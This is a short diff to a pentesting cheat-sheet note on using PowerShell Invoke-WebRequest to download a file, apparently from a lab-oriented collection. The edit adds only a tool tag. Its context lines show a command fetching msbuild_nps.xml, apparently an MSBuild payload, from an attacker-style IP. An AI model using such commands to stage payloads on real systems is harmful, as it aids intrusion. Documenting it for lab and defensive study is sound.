@@ -7,6 +7,8 @@ data: Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
 output: PS C:\> Invoke-WebRequest -uri 10.10.14.45/msbuild_nps.xml -Outfile msbuild_nps.xml
 created_at: '2019-11-14T23:38:41.555233+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[ps]]'
 ---
 
 # Invoke-WebRequest Download a File from a Web Server
